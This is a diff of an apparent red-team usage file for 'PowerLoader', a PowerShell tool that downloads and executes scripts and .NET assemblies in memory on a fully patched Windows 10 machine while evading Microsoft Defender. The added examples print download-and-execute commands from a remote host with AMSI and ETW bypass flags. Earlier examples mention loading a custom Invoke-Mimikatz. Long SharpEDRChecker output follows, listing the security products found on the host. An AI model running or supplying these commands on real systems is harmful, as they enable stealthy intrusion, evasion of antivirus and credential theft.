@@ -22,10 +22,9 @@ Note: To avoid basic detection from the Windows Defender AV, I renamed:
 
 
 ================================================================================================================================
-PoC 1 - Example with the script 'PowerUp.ps1' loaded with 'PowerLoader' on a Windows 10 laptop fully patched with the Microsoft 
-        Defender AV enabled and up-to-date
+Example 1 - Download and execute into-memory the script 'PowerUp.ps1' with 'PowerLoader' on a Windows 10 laptop fully patched 
+            with the Microsoft Defender AV enabled and up-to-date
 ================================================================================================================================
-
 
 C:\Users\pentester>net user pentester
 User name                    pentester
@@ -94,10 +93,11 @@ AbuseFunction  : Write-HijackDll -OutputFile 'C:\Python27\\wlbsctrl.dll' -Comman
 
 <SNIP>
 
-=============================================================================================================================================
-PoC 2 - Example with the script 'Invoke-mimkatz.ps1' (custom version) loaded with 'PowerLoader' on a Windows 10 laptop fully patched 
-        and with the Microsoft Defender AV enabled and up-to-date
-=============================================================================================================================================
+
+========================================================================================================================================
+Example 2 - Download and execute into-memory the script 'Invoke-mimkatz.ps1' (custom version) with 'PowerLoader' on a Windows 10 laptop 
+            fully patched with the Microsoft Defender AV enabled and up-to-date
+========================================================================================================================================
 
 C:\Users\Administrator\Desktop>powershell -exec bypass
 Windows PowerShell
@@ -122,6 +122,7 @@ At line:1 char:1
 This script contains malicious content and has been blocked by your antivirus software.
     + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
     + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
 
 PS C:\Users\Administrator\Desktop> invoke-command -scriptblock $payload0
 
@@ -175,4 +176,420 @@ At line:1 char:1
     + FullyQualifiedErrorId : CommandNotFoundException
 
 
+========================================================================================================================================
+Example 3 - Download and execute into-memory SharpUp.exe (C# / .NET assembly)  with 'PowerLoader' on a Windows 10 laptop fully patched 
+            with the Microsoft Defender AV enabled and up-to-date
+========================================================================================================================================
+
+C:\Users\pentester>powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\pentester> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+
+
+PS C:\Users\pentester> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/PowerLoaderCustom.ps1');
+
+PS C:\Users\pentester> $payload0 = New-PowerLoader-Custom -Type NetASM -FileUrl "https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/SharpUp.exe?raw=true" -ArgumentList audit -Bypass AntiMSI,ETW
+
+PS C:\Users\pentester> invoke-command -scriptblock $payload0
+
+=== SharpUp: Running Privilege Escalation Checks ===
+[!] Modifialbe scheduled tasks were not evaluated due to permissions.
+
+=== Modifiable Folders in %PATH% ===
+        C:\Python27
+        C:\metasploit-framework\bin\
+
+[*] Completed Privesc Checks in 12 seconds
+
+PS C:\Users\pentester>
+
+
+========================================================================================================================================
+Example 4 - Download and execute into-memory SharpEDRChecker.exe (C# / .NET assembly)  with 'PowerLoader' on a Windows 10 laptop fully patched 
+            with the Microsoft Defender AV enabled and up-to-date
+========================================================================================================================================
+
+PS C:\Users\pentester> $payload0 = New-PowerLoader-Custom -Type NetASM -FileUrl "https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/SharpEDRChecker.exe?raw=true" -Bypass AntiMSI,ETW
+PS C:\Users\pentester> invoke-command -scriptblock $payload0
+
+###################################################################################################
+                    [!][!][!] Welcome to SharpEDRChecker by @PwnDexter [!][!][!]
+[-][-][-] Not running as admin, some privileged metadata and processes may not be checked [-][-][-]
+###################################################################################################
+
+######################################
+[!][!][!] Checking processes [!][!][!]
+######################################
+
+[-] Suspicious process found:
+        Name: MsMpEng.exe
+        Description: MsMpEng.exe
+        Caption: MsMpEng.exe
+        Binary:
+        Process ID: 5672
+        Parent Process: 920
+        Process CmdLine:
+        File Metadata:
+[!] Matched on: msmpeng
+
+[-] Suspicious process found:
+        Name: SecurityHealthService.exe
+        Description: SecurityHealthService.exe
+        Caption: SecurityHealthService.exe
+        Binary:
+        Process ID: 12004
+        Parent Process: 920
+        Process CmdLine:
+        File Metadata:
+[!] Matched on: securityhealthservice
+
+[-] Suspicious process found:
+        Name: SecHealthUI.exe
+        Description: SecHealthUI.exe
+        Caption: SecHealthUI.exe
+        Binary: C:\WINDOWS\SystemApps\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\SecHealthUI.exe
+        Process ID: 15660
+        Parent Process: 8
+        Process CmdLine: "C:\WINDOWS\SystemApps\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\SecHealthUI.exe" -ServerName:SecHealthUI.AppXep4x2tbtjws1v9qqs0rmb3hxykvkpqtn.mca
+        File Metadata:
+                 Product Name: Microsoft® Windows® Operating System
+                 Filename: C:\WINDOWS\SystemApps\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\SecHealthUI.exe
+                 Original Filename: SecHealthUI.exe
+                 Internal Name: SecHealthUI
+                 Company Name: Microsoft Corporation
+                 File Description: Windows Defender application
+                 Product Version: 10.0.19041.2075
+                 Comments:
+                 Legal Copyright: © Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: defender
+
+[-] Suspicious process found:
+        Name: NisSrv.exe
+        Description: NisSrv.exe
+        Caption: NisSrv.exe
+        Binary:
+        Process ID: 5288
+        Parent Process: 920
+        Process CmdLine:
+        File Metadata:
+[!] Matched on: nissrv
+
+###################################################################
+[!][!][!] Checking modules loaded in your current process [!][!][!]
+###################################################################
+
+[-] Suspicious modload found in your process:
+        Suspicious Module: C:\WINDOWS\SYSTEM32\amsi.dll
+        File Metadata:
+                 Product Name: Microsoft® Windows® Operating System
+                 Filename: C:\WINDOWS\SYSTEM32\amsi.dll
+                 Original Filename: amsi.dll
+                 Internal Name: amsi.dll
+                 Company Name: Microsoft Corporation
+                 File Description: Anti-Malware Scan Interface
+                 Product Version: 10.0.19041.2075
+                 Comments:
+                 Legal Copyright: © Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: amsi.dll, anti-malware, malware
+
+[-] Suspicious modload found in your process:
+        Suspicious Module: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2211.5-0\MpOav.dll
+        File Metadata:
+                 Product Name: Microsoft® Windows® Operating System
+                 Filename: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2211.5-0\MpOav.dll
+                 Original Filename: MpOAV.dll
+                 Internal Name: MpOAV
+                 Company Name: Microsoft Corporation
+                 File Description: IOfficeAntiVirus Module
+                 Product Version: 4.18.2211.5
+                 Comments:
+                 Legal Copyright: © Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: antivirus, defender
+
+[-] Suspicious modload found in your process:
+        Suspicious Module: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2211.5-0\MPCLIENT.DLL
+        File Metadata:
+                 Product Name: Microsoft® Windows® Operating System
+                 Filename: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2211.5-0\MPCLIENT.DLL
+                 Original Filename: mpclient.dll
+                 Internal Name: mpclient
+                 Company Name: Microsoft Corporation
+                 File Description: Client Interface
+                 Product Version: 4.18.2211.5
+                 Comments:
+                 Legal Copyright: © Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: defender
+
+########################################
+[!][!][!] Checking Directories [!][!][!]
+########################################
+
+[-] Suspicious directory found: C:\Program Files\Windows Defender
+[!] Matched on: defender
+
+[-] Suspicious directory found: C:\Program Files\Windows Defender Advanced Threat Protection
+[!] Matched on: defender, threat
+
+[-] Suspicious directory found: C:\Program Files (x86)\Windows Defender
+[!] Matched on: defender
+
+#####################################
+[!][!][!] Checking Services [!][!][!]
+#####################################
+
+[!] Could not get file info for: C:\
+
+[-] Suspicious service found:
+        Name: mpssvc
+        DisplayName: Windows Defender Firewall
+        Description: Windows Defender Firewall helps to protect your computer by preventing unauthorised users from gaining access to your computer through the Internet or a network.
+        Caption: Windows Defender Firewall
+        Binary: C:\WINDOWS\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
+        Status: Running
+        Process ID: 2260
+        File Metadata:
+                 Product Name: Microsoft® Windows® Operating System
+                 Filename: C:\WINDOWS\system32\svchost.exe
+                 Original Filename: svchost.exe.mui
+                 Internal Name: svchost.exe
+                 Company Name: Microsoft Corporation
+                 File Description: Host Process for Windows Services
+                 Product Version: 10.0.19041.2364
+                 Comments:
+                 Legal Copyright: © Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: defender
+
+[-] Suspicious service found:
+        Name: PolicyAgent
+        DisplayName: IPsec Policy Agent
+        Description: Internet Protocol security (IPsec) supports network-level peer authentication, data origin authentication, data integrity, data confidentiality (encryption), and replay protection.  This service enforces IPsec policies created through the IP Security Policies snap-in or the command-line tool "netsh ipsec".  If you stop this service, you may experience network connectivity issues if your policy requires that connections use IPsec.  Also,remote management of Windows Defender Firewall is not available when this service is stopped.
+        Caption: IPsec Policy Agent
+        Binary: C:\WINDOWS\system32\svchost.exe -k NetworkServiceNetworkRestricted -p
+        Status: Running
+        Process ID: 3624
+        File Metadata:
+                 Product Name: Microsoft® Windows® Operating System
+                 Filename: C:\WINDOWS\system32\svchost.exe
+                 Original Filename: svchost.exe.mui
+                 Internal Name: svchost.exe
+                 Company Name: Microsoft Corporation
+                 File Description: Host Process for Windows Services
+                 Product Version: 10.0.19041.2364
+                 Comments:
+                 Legal Copyright: © Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: defender
+
+[-] Suspicious service found:
+        Name: SecurityHealthService
+        DisplayName: Windows Security Service
+        Description: Windows Security Service handles unified device protection and health information
+        Caption: Windows Security Service
+        Binary: C:\WINDOWS\system32\SecurityHealthService.exe
+        Status: Running
+        Process ID: 12004
+        File Metadata:
+                 Product Name: Microsoft® Windows® Operating System
+                 Filename: C:\WINDOWS\system32\SecurityHealthService.exe
+                 Original Filename: SecurityHealthService.exe
+                 Internal Name: SecurityHealthService
+                 Company Name: Microsoft Corporation
+                 File Description: Windows Security Health Service
+                 Product Version: 4.18.1907.16384
+                 Comments:
+                 Legal Copyright: © Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: securityhealthservice
+
+[-] Suspicious service found:
+        Name: Sense
+        DisplayName: Windows Defender Advanced Threat Protection Service
+        Description: Windows Defender Advanced Threat Protection service helps protect against advanced threats by monitoring and reporting security events that happen on the computer.
+        Caption: Windows Defender Advanced Threat Protection Service
+        Binary: "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"
+        Status: Stopped
+        Process ID: 0
+        File Metadata:
+                 Product Name: Microsoft® Windows® Operating System
+                 Filename: C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe
+                 Original Filename: MsSense.exe.mui
+                 Internal Name: MsSense.exe
+                 Company Name: Microsoft Corporation
+                 File Description: Windows Defender Advanced Threat Protection Service Executable
+                 Product Version: 10.8295.19041.2364
+                 Comments:
+                 Legal Copyright: © Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: defender, threat
+
+[-] Suspicious service found:
+        Name: WdNisSvc
+        DisplayName: Microsoft Defender Antivirus Network Inspection Service
+        Description: Helps guard against intrusion attempts targeting known and newly discovered vulnerabilities in network protocols
+        Caption: Microsoft Defender Antivirus Network Inspection Service
+        Binary: "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2211.5-0\NisSrv.exe"
+        Status: Running
+        Process ID: 5288
+        File Metadata:
+                 Product Name: Microsoft® Windows® Operating System
+                 Filename: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2211.5-0\NisSrv.exe
+                 Original Filename: NisSrv.exe
+                 Internal Name: NisSrv.exe
+                 Company Name: Microsoft Corporation
+                 File Description: Microsoft Network Realtime Inspection Service
+                 Product Version: 4.18.2211.5
+                 Comments:
+                 Legal Copyright: © Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: antivirus, defender, nissrv
+
+[-] Suspicious service found:
+        Name: WinDefend
+        DisplayName: Microsoft Defender Antivirus Service
+        Description: Helps protect users from malware and other potentially unwanted software
+        Caption: Microsoft Defender Antivirus Service
+        Binary: "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2211.5-0\MsMpEng.exe"
+        Status: Running
+        Process ID: 5672
+        File Metadata:
+                 Product Name: Microsoft® Windows® Operating System
+                 Filename: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2211.5-0\MsMpEng.exe
+                 Original Filename: MsMpEng.exe
+                 Internal Name: MsMpEng.exe
+                 Company Name: Microsoft Corporation
+                 File Description: Antimalware Service Executable
+                 Product Version: 4.18.2211.5
+                 Comments:
+                 Legal Copyright: © Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: antimalware, antivirus, defender, malware, msmpeng
+
+[-] Suspicious service found:
+        Name: wscsvc
+        DisplayName: Security Center
+        Description: The WSCSVC (Windows Security Center) service monitors and reports security health settings on the computer.  The health settings include firewall (on/off), antivirus (on/off/out of date), antispyware (on/off/out of date), Windows Update (automatically/manually download and install updates), User Account Control (on/off), and Internet settings (recommended/not recommended). The service provides COM APIs for independent software vendors to register and record the state of their products to the Security Center service.  The Security and Maintenance UI uses the service to provide systray alerts and a graphical view of the security health states in the Security and Maintenance control panel.  Network Access Protection (NAP) uses the service to report the security health states of clients to the NAP Network Policy Server to make network quarantine decisions.  The service also has a public API that allows external consumers to programmatically retrieve the aggregated security health state of the system.
+        Caption: Security Center
+        Binary: C:\WINDOWS\System32\svchost.exe -k LocalServiceNetworkRestricted -p
+        Status: Running
+        Process ID: 7492
+        File Metadata:
+                 Product Name: Microsoft® Windows® Operating System
+                 Filename: C:\WINDOWS\System32\svchost.exe
+                 Original Filename: svchost.exe.mui
+                 Internal Name: svchost.exe
+                 Company Name: Microsoft Corporation
+                 File Description: Host Process for Windows Services
+                 Product Version: 10.0.19041.2364
+                 Comments:
+                 Legal Copyright: © Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: antivirus
+
+####################################
+[!][!][!] Checking drivers [!][!][!]
+####################################
+
+[-] Suspicious driver found:
+        Suspicious Module: WdFilter.sys
+        File Metadata:
+                 Product Name: Microsoft® Windows® Operating System
+                 Filename: c:\windows\system32\drivers\wd\wdfilter.sys
+                 Original Filename: WdFilter.sys
+                 Internal Name: WdFilter
+                 Company Name: Microsoft Corporation
+                 File Description: Microsoft antimalware file system filter driver
+                 Product Version: 4.18.2211.5
+                 Comments:
+                 Legal Copyright: © Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: antimalware, malware
+
+[!] Could not get file info for: c:\Windows\Sysnative\drivers\dump_dumpstorport.sys
+
+[!] Could not get file info for: c:\Windows\Sysnative\drivers\dump_stornvme.sys
+
+[!] Could not get file info for: c:\Windows\Sysnative\drivers\dump_dumpfve.sys
+
+[-] Suspicious driver found:
+        Suspicious Module: WdNisDrv.sys
+        File Metadata:
+                 Product Name: Microsoft® Windows® Operating System
+                 Filename: c:\windows\system32\drivers\wd\wdnisdrv.sys
+                 Original Filename: wdnisdrv.sys
+                 Internal Name: wdnisdrv.sys
+                 Company Name: Microsoft Corporation
+                 File Description: Windows Defender Network Stream Filter
+                 Product Version: 4.18.2211.5
+                 Comments:
+                 Legal Copyright: © Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: defender
+
+[-] Suspicious driver found:
+        Suspicious Module: MpKslDrv.sys
+        File Metadata:
+                 Product Name: Microsoft Malware Protection
+                 Filename: c:\programdata\microsoft\windows defender\definition updates\{667228ba-fe1e-4fab-b024-22471cdb4ee9}\mpksldrv.sys
+                 Original Filename: KSLD.sys
+                 Internal Name: KSLD
+                 Company Name: Microsoft Corporation
+                 File Description: KSLD
+                 Product Version: 1.1.19849.0
+                 Comments:
+                 Legal Copyright: © Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: defender, malware
+
+################################
+[!][!][!] TLDR Summary [!][!][!]
+################################
+
+[!] Process Summary:
+        [-] MsMpEng.exe : msmpeng
+        [-] SecurityHealthService.exe : securityhealthservice
+        [-] SecHealthUI.exe : defender
+        [-] NisSrv.exe : nissrv
+
+
+[!] Modload Summary:
+        [-] C:\WINDOWS\SYSTEM32\amsi.dll : amsi.dll, anti-malware, malware
+        [-] C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2211.5-0\MpOav.dll : antivirus, defender
+        [-] C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2211.5-0\MPCLIENT.DLL : defender
+
+
+[!] Directory Summary:
+        [-] C:\Program Files\Windows Defender : defender
+        [-] C:\Program Files\Windows Defender Advanced Threat Protection : defender, threat
+        [-] C:\Program Files (x86)\Windows Defender : defender
+
+
+[!] Service Summary:
+        [-] mpssvc : defender
+        [-] PolicyAgent : defender
+        [-] SecurityHealthService : securityhealthservice
+        [-] Sense : defender, threat
+        [-] WdNisSvc : antivirus, defender, nissrv
+        [-] WinDefend : antimalware, antivirus, defender, malware, msmpeng
+        [-] wscsvc : antivirus
+
+
+[!] Driver Summary:
+        [-] WdFilter.sys : antimalware, malware
+        [-] WdNisDrv.sys : defender
+        [-] MpKslDrv.sys : defender, malware
+
+#######################################
+[!][!][!] EDR Checks Complete [!][!][!]
+#######################################
 
